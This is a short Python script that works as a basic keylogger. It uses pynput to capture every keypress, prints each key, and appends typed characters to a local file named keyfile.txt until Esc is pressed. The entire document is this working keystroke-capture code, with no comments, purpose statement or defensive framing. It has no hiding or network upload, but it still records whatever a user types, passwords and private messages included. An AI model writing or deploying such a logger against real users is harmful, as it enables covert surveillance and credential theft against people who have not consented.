from pynput import keyboard

STOP_KEY = keyboard.Key.esc
stop_pressed = False

def keyPressed(key):
    global stop_pressed
    if key == STOP_KEY:
        stop_pressed = True
        return False

    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

while not stop_pressed:
    pass

listener.stop()